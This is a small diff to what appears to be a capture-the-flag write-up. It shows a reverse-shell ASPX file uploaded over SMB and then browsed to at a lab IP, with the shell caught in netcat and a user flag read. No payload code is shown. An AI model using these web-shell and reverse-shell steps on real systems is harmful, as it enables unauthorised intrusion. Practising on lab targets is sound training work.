@@ -174,7 +174,9 @@ Then move **shell.aspx** -> smbclient:
 > put shell.aspx
 ```
 
-*Completed.*
+Navigate: http://10.80.131.73:49663/nt4wrksv/shell.aspx
+
+*Catch the reverse shell in netcat.*
 
 ```text
 c:\Users\Bob\Desktop>type user.txt
